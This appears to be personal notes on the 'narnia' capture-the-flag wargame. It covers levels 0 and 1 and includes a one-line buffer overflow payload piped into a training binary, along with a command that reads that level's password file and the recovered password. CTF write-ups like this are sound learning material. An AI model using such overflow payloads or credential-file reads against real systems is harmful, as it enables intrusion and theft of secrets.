

narnia seems to have 9 levels, narnia 0 .. 9.
Unlike in prior games, every level seems to involve an executable these are stored at `/narnia`, only the level specific one and its respective source code is accesible to the current user.

## level 0

as alwasy the credentials of the frist level were given freely.
username: narnia0
password: narnia0

## level 1

`(perl -e 'print "0"x20 . "\xef\xbe\xad\xde"'; echo "cat /etc/narnia_pass/narnia1") | ./narnia0`

username: narnia1
password: efeidiedae
